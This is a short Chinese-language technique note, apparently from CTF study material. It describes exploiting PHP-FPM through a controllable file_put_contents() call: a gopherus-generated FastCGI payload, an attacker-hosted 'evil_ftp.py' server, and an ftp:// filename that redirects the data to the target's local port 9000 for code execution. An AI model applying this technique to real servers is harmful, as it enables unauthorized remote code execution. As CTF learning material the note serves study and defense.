如果开启了`FPM/FastCGI`

我们就可以使用`file_put_contents`和`ftp`配合打内网

当然，我们需要注意，他开启的端口是多少，到时候生成payload的时候需要按照这个端口进行更改

默认端口是**9000**

#### 生成payload

使用`gopherus`来生成payload，（工具在KALI中）

```python
python gopherus.py --exploit fastcgi
```

之后需要指定一个已知路径的.php文件

默认是`/var/www/html/index.php`

之后需要输入需要执行的命令

之后得到的payload，只需要`_`之后的内容

#### 搭建ftp服务

在vps上面使用vps搭建简易的ftp服务

`evil_ftp.py`

#### 触发命令

在vps上监听端口

利用`file_put_contents`的filename设为`ftp://aaa@ip/123`, data设为`payload`

如果目标主机上正在运行着 `PHP-FPM`，并且有一个`file_put_contents()`函数的参数是可控的，我们上面是利用了`gopher://`协议，但是`file_put_contents()`函数并不支持他，这里可以使用的是`ftp`协议

这里使用的是 `FTP` 协议的被动模式：客户端试图从`FTP`服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的`IP`和端口上，我们可以指定到`127.0.0.1:9000`，这样就可以向目标主机本地的 `PHP-FPM` 发送一个任意的数据包，从而执行代码，造成`SSRF`

参考：[通过一道CTF题学习php-fpm攻击_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)](https://bbs.ichunqiu.com/thread-60888-1-1.html)